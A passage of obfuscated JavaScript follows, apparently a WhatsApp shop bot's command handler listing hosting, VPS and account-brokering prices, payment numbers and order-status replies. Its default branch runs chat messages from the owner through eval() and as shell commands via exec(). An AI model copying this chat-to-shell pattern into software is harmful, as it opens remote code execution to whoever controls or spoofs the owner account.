‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n⌜ TAGG KABEHAN BY KAZEY OFFCIAL ⌟\n";
          for (let _0xbe5890 of _0xf906a3) {
            _0x5143eb += "⊝ @" + _0xbe5890.id.split("@")[0] + "\n";
          }
          _0x554af5.sendMessage(_0x2f68f6, {
            text: _0x5143eb,
            mentions: _0xf906a3.map(_0xd0e32a => _0xd0e32a.id)
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "public":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          _0x554af5.public = true;
          _0x3f20c7(mess.success);
        }
        break;
      case "self":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          _0x554af5.public = false;
          _0x3f20c7(mess.success);
        }
        break;
      case "formatneed":
        {
          const _0xff277c = "*FORMAT JASA NEED AKUN BY " + botname + "*\n*( BUKAN AKUN ADMIN )*\n\nNAMA PEMILIK : \nAKUN :\nLOGIN :\nHARGA : \nSPEK AKUN :  \n  \n*#TIDAK MENERIMA KIRKON*\n\n📝𝐍𝐎𝐓𝐄 : \n*WAJIB MENGGUNAKAN JASA ADMIN " + botname + " UNTUK MENGHINDARI PENIPUAN*\n\n*PERINGATAN ⚠️*\n*MOHON NAMA PEMILIK AKUNNYA HARUS DI ISI DENGAN BENAR AGAR SELLER GAMPANG DI CARI*";
          _0x554af5.sendMessage(_0x2f68f6, {
            image: {
              url: "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg"
            },
            caption: _0xff277c,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [_0x3594d7],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "formatpost":
        {
          const _0x25bd3b = "🥀FORMAT JASPOST BY " + botname + "🥀\n(BUKAN AKUN MILIK ADMIN)\n                   \nJUAL AKUN :\nSPEK :\nHARGA:\nNOMER : wa.me/\n\n\nNOTE‼️: WAJIB MENGGUNAKAN JASA ADMIN " + botname + " AGAR TERHINDAR DARI PENIPUAN\n\n\n🥀BEE SMART BUYER🥀";
          _0x554af5.sendMessage(_0x2f68f6, {
            image: {
              url: "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg"
            },
            caption: _0x25bd3b,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [_0x3594d7],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "feerekber":
        {
          const _0x5102e2 = "FEE BER² " + botname + "\n•0 - 20K ≠ 5K\n•21K - 150K ≠ 10K\n•151K - 200K ≠ 15K\n•201K - 324K ≠ 20K\n•325K - 400K ≠ 25K\n•401K - 500K ≠ 30K\n•501K - 599K ≠ 35K\n•600K - 699K ≠ 40K\n•700K - 799K ≠ 45K\n•800K - 1JT ≠ 50K\n•1,1JT - 1,7JT ≠ 70K\n•1,8JT - 2,5JT ≠ 100K\n•BTBER ≠ 50K \n•TTBEB ≠ 50K";
          _0x554af5.sendMessage(_0x2f68f6, {
            image: {
              url: "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg"
            },
            caption: _0x5102e2,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [_0x3594d7],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "listpanel":
        {
          const _0x53fc3f = "SEWA PANEL drayyy\n\n➠ PANEL PROMO FRESH PROMO\n\n╭━「 PAKET SILVER 」\n│⛁ RAM 1GB | CPU 30%\n╰━━━☉ HARGA : 3k\n\n╭━「 PAKET SILVER 」\n│⛁ RAM 2GB | CPU 50%\n╰━━━☉ HARGA : 5k\n\n╭━「 PAKET GOLD 」\n│⛁ RAM 3GB | CPU 70%\n╰━━━☉ HARGA : 7K\n\n╭━「 PLATINUM (HOT) 」\n│⛁ RAM 4GB | CPU 90%\n╰━━━☉ HARGA : 9K\n\n╭━「 EXECUTIVE 」\n│⛁ RAM 5GB | CPU 100%\n╰━━━☉ HARGA : 10K\n\n╭━「 ULTIMATE (HOT) 」\n│⛁ RAM 7GB | CPU 130%\n╰━━━☉ HARGA : 12K\n\n╭━「 SUPER ULTIMATE 」\n│⛁ RAM UNLI | CPU UNLI%\n╰━━━☉ HARGA : 15K\n\n*Reqwest ram dan cpu chat langsung\n\nKeuntungan sewa panel di kami?\n➠ Server terjaga \n➠ Jual kualitas bukan asal jual\n➠ Hemat kuota \n➠ Hemat penyimpanan\n➠ Web close? bot tetep on!\n\n*Harga diatas adalah untuk 1bulan\n\nMINAT CHAT : \nhttps://wa.me/6283169231840";
          _0x554af5.sendMessage(_0x2f68f6, {
            image: {
              url: "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg"
            },
            caption: _0x53fc3f,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [_0x3594d7],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "listvps":
        {
          const _0x14810f = "OPEN VPS NYA JUGA BUAT SERVER SENDIRI\nREADY PROMO VPS NYA KAK ‼️\n\nLIST :\n📮 VPS RAM 16GB 8 CORE : 100K\n📮 VPS RAM 8GB 4 CORE : 55K\n📮 VPS RAM 4GB 2 CORE : 45K\n📮 VPS RAM 2GB 1 CORE : 35K\n📮 VPS RAM 1GB 1 CORE : 25K\n\nKEUNTUNGAN :\nBUY VPS RAM 4 & 8 FREE SC TEMA\nFREE INSTAL PANEL\nNEGO KE PM AJA ASAL MENGOTAK\n FREE SC CRETAE PANEL BUY VPS RAM 4 & 8";
          _0x554af5.sendMessage(_0x2f68f6, {
            image: {
              url: "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg"
            },
            caption: _0x14810f,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [_0x3594d7],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "produklain":
        {
          const _0x4b4734 = "💎MENYEDIAKAN\n\n• OPEN OWNER = 35k\n• JASA EDIT SCRIPT PANEL = TERGANTUNG\n• JASA TAMBAH FITUR SCRIPT = TERGANTUNG\n• JASA FIX SCRIPT EROR = TERGANTUNG\n• JASA BUAT SC PRIBADI = TERGANTUNG\n• JASA INSTALL PANEL PTERIDACTYL = 10K\n• JASA INSTALL THEME = 10K BISA NEGO\n• READY Panel RUN BOT ON 24 JAM = KEITK .listpanel\n• READY VPS = KETIK .listvps\n• READY ADMIN PANEL = 15K\n• READY RESELLER PANEL = 10K\n• READY SC NO ENC 100% = TANYA AJA \n• READY SC CPANEL BY dray = 15-20K\n• READY SC PUSHKONTAK X STORE BY dray = 10K\n• DLL TANYA AJA KALO ADA YANG DI BUTUHIN";
          _0x554af5.sendMessage(_0x2f68f6, {
            image: {
              url: "https://telegra.ph/file/44a68808942d029924e24.jpg"
            },
            caption: _0x4b4734,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [_0x3594d7],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "setproses":
      case "setp":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x2ece04) {
            return _0x5dd2ef.reply("Gunakan dengan cara " + (_0x505e97 + _0x3c8344) + " *teks*\n\n_Contoh_\n\n" + (_0x505e97 + _0x3c8344) + " Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) ");
          }
          if (isSetProses(_0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x25b93d)) {
            return _0x5dd2ef.reply("Set proses already active");
          }
          addSetProses(_0x2ece04, _0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x25b93d);
          _0x3f20c7("✅ Done set proses!");
        }
        break;
      case "changeproses":
      case "changep":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x2ece04) {
            return _0x5dd2ef.reply("Gunakan dengan cara " + (_0x505e97 + _0x3c8344) + " *teks*\n\n_Contoh_\n\n" + (_0x505e97 + _0x3c8344) + " Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) ");
          }
          if (isSetProses(_0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x25b93d)) {
            changeSetProses(_0x2ece04, _0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x25b93d);
            _0x5dd2ef.reply("Sukses ubah set proses!");
          } else {
            addSetProses(_0x2ece04, _0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x25b93d);
            _0x5dd2ef.reply("Sukses ubah set proses!");
          }
        }
        break;
      case "delsetproses":
      case "delsetp":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!isSetProses(_0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x25b93d)) {
            return _0x5dd2ef.reply("Belum ada set proses di gc ini");
          }
          removeSetProses(_0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x25b93d);
          _0x3f20c7("Sukses delete set proses");
        }
        break;
      case "setdone":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x2ece04) {
            return _0x5dd2ef.reply("Gunakan dengan cara " + (_0x505e97 + _0x3c8344) + " *teks*\n\n_Contoh_\n\n" + (_0x505e97 + _0x3c8344) + " Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) ");
          }
          if (isSetDone(_0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x56ad2b)) {
            return _0x5dd2ef.reply("Udh set done sebelumnya");
          }
          addSetDone(_0x2ece04, _0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x56ad2b);
          _0x3f20c7("Sukses set done!");
          break;
        }
      case "changedone":
      case "changed":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x2ece04) {
            return _0x5dd2ef.reply("Gunakan dengan cara " + (_0x505e97 + _0x3c8344) + " *teks*\n\n_Contoh_\n\n" + (_0x505e97 + _0x3c8344) + " Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) ");
          }
          if (isSetDone(_0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x56ad2b)) {
            changeSetDone(_0x2ece04, _0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x56ad2b);
            _0x5dd2ef.reply("Sukses ubah set done!");
          } else {
            addSetDone(_0x2ece04, _0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x56ad2b);
            _0x5dd2ef.reply("Sukses ubah set done!");
          }
        }
        break;
      case "delsetdone":
      case "delsetd":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!isSetDone(_0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x56ad2b)) {
            return _0x5dd2ef.reply("Belum ada set done di gc ini");
          }
          removeSetDone(_0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x56ad2b);
          _0x5dd2ef.reply("Sukses delete set done");
        }
        break;
      case "p":
      case "proses":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5dd2ef.quoted) {
            return _0x5dd2ef.reply("Reply pesanan yang akan proses");
          }
          let _0x2b91b6 = _0x5dd2ef.quoted ? _0x5c113a.text : _0x5c113a.text.split(_0x1d31fd[0])[1];
          let _0x4be65b = "「 *TRANSAKSI PENDING* 」\n\n```📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Pending```\n\n📝 Catatan :\n@pesanan\n\nPesanan @user sedang di proses!";
          const _0x30811c = getTextSetProses(_0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x25b93d);
          if (_0x30811c !== undefined) {
            var _0x5edced = _0x30811c.replace("@pesanan", _0x2b91b6 ? _0x2b91b6 : "-").replace("@user", "@" + _0x5dd2ef.quoted.sender.split("@")[0]).replace("@jam", _0x437c7f).replace("@tanggal", tanggal(new Date())).replace("@user", "@" + _0x5dd2ef.quoted.sender.split("@")[0]);
            _0x554af5.sendTextWithMentions(_0x5dd2ef.chat, _0x5edced, _0x5dd2ef);
          } else {
            _0x554af5.sendTextWithMentions(_0x5dd2ef.chat, _0x4be65b.replace("@pesanan", _0x2b91b6 ? _0x2b91b6 : "-").replace("@user", "@" + _0x5dd2ef.quoted.sender.split("@")[0]).replace("@jam", _0x437c7f).replace("@tanggal", tanggal(new Date())).replace("@user", "@" + _0x5dd2ef.quoted.sender.split("@")[0]), _0x5dd2ef);
          }
        }
        break;
      case "d":
      case "done":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5dd2ef.quoted) {
            return _0x5dd2ef.reply("Reply pesanan yang telah di proses");
          }
          let _0x59dfd8 = _0x5dd2ef.quoted ? _0x5c113a.text : _0x5c113a.text.split(_0x1d31fd[0])[1];
          let _0x4955b4 = "「 *TRANSAKSI BERHASIL* 」\n\n```📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Berhasil```\n\nTerimakasih @user Next Order ya🙏";
          const _0x4b3a7f = getTextSetDone(_0x5dd2ef.isGroup ? _0x5dd2ef.chat : _0x48a68a, _0x56ad2b);
          if (_0x4b3a7f !== undefined) {
            var _0x5edced = _0x4b3a7f.replace("@pesanan", _0x59dfd8 ? _0x59dfd8 : "-").replace("@user", "@" + _0x5dd2ef.quoted.sender.split("@")[0]).replace("@jam", _0x437c7f).replace("@tanggal", tanggal(new Date())).replace("@user", "@" + _0x5dd2ef.quoted.sender.split("@")[0]);
            _0x554af5.sendTextWithMentions(_0x5dd2ef.chat, _0x5edced, _0x5dd2ef);
          } else {
            _0x554af5.sendTextWithMentions(_0x5dd2ef.chat, _0x4955b4.replace("@pesanan", _0x59dfd8 ? _0x59dfd8 : "-").replace("@user", "@" + _0x5dd2ef.quoted.sender.split("@")[0]).replace("@jam", _0x437c7f).replace("@tanggal", tanggal(new Date())).replace("@user", "@" + _0x5dd2ef.quoted.sender.split("@")[0]), _0x5dd2ef);
          }
        }
        break;
      case "addtesti":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.owner);
          }
          if (_0x1d31fd.length < 1) {
            return _0x3f20c7("Apa nama testinya?");
          }
          if (_0x54c711.includes(q)) {
            return _0x3f20c7("Nama tersebut sudah digunakan");
          }
          let _0x1e6c5f = await _0x554af5.downloadAndSaveMediaMessage(_0x5c113a);
          _0x54c711.push(q);
          await fsx.copy(_0x1e6c5f, "./database/dray/" + q + ".jpg");
          fs.writeFileSync("./database/testimoni.json", JSON.stringify(_0x54c711));
          fs.unlinkSync(_0x1e6c5f);
          _0x3f20c7("Sukses Menambakan Testimoni\nCek Dengan Mengetik " + _0x505e97 + "testimoni");
        }
        break;
      case "deltesti":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.owner);
          }
          if (_0x1d31fd.length < 1) {
            return _0x3f20c7("Masukkan nama gambar");
          }
          if (!_0x54c711.includes(q)) {
            return _0x3f20c7("Namanya tidak ada di database");
          }
          let _0x3d2c69 = _0x54c711.indexOf(q);
          _0x54c711.splice(_0x3d2c69, 1);
          fs.writeFileSync("./database/testimoni.json", JSON.stringify(_0x54c711));
          fs.unlinkSync("./database/dray/" + q + ".jpg");
          _0x3f20c7("Sukses Delete Testi " + q);
        }
        break;
      case "testimoni":
        {
          let _0x21b37f = "┌──⭓「 *testi List* 」\n│\n";
          for (let _0x214bb1 of _0x54c711) {
            _0x21b37f += "│⭔ " + _0x214bb1 + "\n";
          }
          _0x21b37f += "│\n└────────────⭓\n\n*Totally there are : " + _0x54c711.length + "*";
          _0x3f20c7(_0x21b37f);
        }
        break;
      case "donasi":
        {
          const _0x5d75d3 = global.ownerNumber + "@s.whatsapp.net";
          let _0x464d6d = "*-------「 DONASI BY DRAY 」 -------*\n\nUNTUK QRIS SILAHKAN SCAN FOTO DI ATAS\n\nDANA : 083169231840\nOVO : 083169231840\nGOPAY : 083169231840\n\n*KETIK .proses AGAR PESANAN ANDA LANGSUNG*\n*KAMI PROSES*";
          _0x554af5.sendMessage(_0x2f68f6, {
            image: {
              url: "https://telegra.ph/file/34b0c1061097900bffd29.jpg"
            },
            caption: "" + _0x464d6d
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "payment":
        {
          const _0x33a5d8 = global.ownerNumber + "@s.whatsapp.net";
          let _0x41ad96 = "*-------「 PAYMENT BY DRAY 」 -------*\n\nUNTUK QRIS SILAHKAN SCAN FOTO DI ATAS\n\nDANA : " + dana + "\nOVO : " + gopay + "\nGOPAY : " + ovo + "\nSHOPEEPAY : " + shp + "\n\n*KETIK .proses AGAR PESANAN ANDA LANGSUNG*\n*KAMI PROSES*";
          _0x554af5.sendMessage(_0x2f68f6, {
            image: qris,
            caption: "" + _0x41ad96
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "tunda":
        {
          const _0x126f03 = "*TRANSAKSI MENGALAMI PENDING*\n\n\n𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚\n𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥\n\n*AKAN KAMI PROSES SEGERA*";
          _0x3f20c7(_0x126f03);
        }
        break;
      case "batal":
        {
          const _0x19c9c9 = "*TRANSAKSI DI BATALKAN*\n\n📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: " + tanggal + "\n🕰️ 𝗪𝗮𝗸𝘁𝘂: " + jam + "\n✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal\n\n𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹\n";
          _0x3f20c7(_0x19c9c9);
        }
        break;
      case "del":
      case "delete":
        {
          if (_0x4a73b4) {
            if (!_0x439cd6 && !_0x58e970) {
              return _0x5dd2ef.reply(msg.admin);
            }
            if (!_0x5dd2ef.quoted) {
              return _0x5dd2ef.reply("Reply Pesan Yang Ingin Di Hapus");
            }
            if (_0x5dd2ef.quoted.sender == _0x48a68a) {
              _0x554af5.sendMessage(_0x5dd2ef.chat, {
                delete: {
                  remoteJid: _0x5dd2ef.chat,
                  fromMe: true,
                  id: _0x5dd2ef.quoted.id,
                  participant: _0x5dd2ef.quoted.sender
                }
              });
            } else {
              if (!_0x5c5d5c) {
                return _0x5dd2ef.reply(msg.adminbot);
              }
              _0x554af5.sendMessage(_0x5dd2ef.chat, {
                delete: {
                  remoteJid: _0x5dd2ef.chat,
                  fromMe: false,
                  id: _0x5dd2ef.quoted.id,
                  participant: _0x5dd2ef.quoted.sender
                }
              });
            }
          } else {
            if (!_0x439cd6) {
              return _0x5dd2ef.reply(msg.owner);
            }
            if (!_0x5dd2ef.quoted) {
              return _0x5dd2ef.reply("Reply Pesan Yang Ingin Di Hapus");
            }
            _0x554af5.sendMessage(_0x5dd2ef.chat, {
              delete: {
                remoteJid: _0x5dd2ef.chat,
                fromMe: false,
                id: _0x5dd2ef.quoted.id,
                participant: _0x5dd2ef.quoted.sender
              }
            });
          }
        }
        break;
      default:
        if (_0x349f58.startsWith("=>")) {
          if (!_0x439cd6) {
            return false;
          }
          function _0x3bd39f(_0x2114aa) {
            sat = JSON.stringify(_0x2114aa, null, 2);
            bang = util.format(sat);
            if (sat == undefined) {
              bang = util.format(_0x2114aa);
            }
            return _0x3f20c7(bang);
          }
          try {
            _0x3f20c7(util.format(eval("(async () => { return " + _0x349f58.slice(3) + " })()")));
          } catch (_0x1fa892) {
            _0x3f20c7(String(_0x1fa892));
          }
        }
        if (_0x349f58.startsWith(">")) {
          if (!_0x439cd6) {
            return false;
          }
          try {
            let _0x116398 = await eval(_0x349f58.slice(2));
            if (typeof _0x116398 !== "string") {
              _0x116398 = require("util").inspect(_0x116398);
            }
            await _0x3f20c7(_0x116398);
          } catch (_0x373ab3) {
            await _0x3f20c7(String(_0x373ab3));
          }
        }
        if (_0x349f58.startsWith("$")) {
          if (!_0x439cd6) {
            return false;
          }
          exec(_0x349f58.slice(2), (_0x4e1601, _0x1dd33b) => {
            if (_0x4e1601) {
              return _0x3f20c7(_0x4e1601);
            }
            if (_0x1dd33b) {
              return _0x3f20c7(_0x1dd33b);
            }
          });
        }
        if (_0x349f58.match && ["anj", "ngentod", "anjg", " kontol", "asu"].includes(_0x349f58) && !_0x38b0dc) {
          _0x3f20c7("*Dont Toxic*");
        }
        if (_0x38b0dc && _0x349f58.toLowerCase() != undefined) {
          if (_0x2f68f6.endsWith("broadcast")) {
            return;
          }
          if (_0x5dd2ef.isBaileys) {
            return;
          }
          let _0x14ea0a = global.db.data.database;
          if (!(_0x349f58.toLowerCase() in _0x14ea0a)) {
            return;
          }
          _0x554af5.copyNForward(_0x2f68f6, _0x14ea0a[_0x349f58.toLowerCase()], true);
        }
    }
  } catch (_0x4faeb1) {
    _0x5dd2ef.reply(util.format(_0x4faeb1));
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});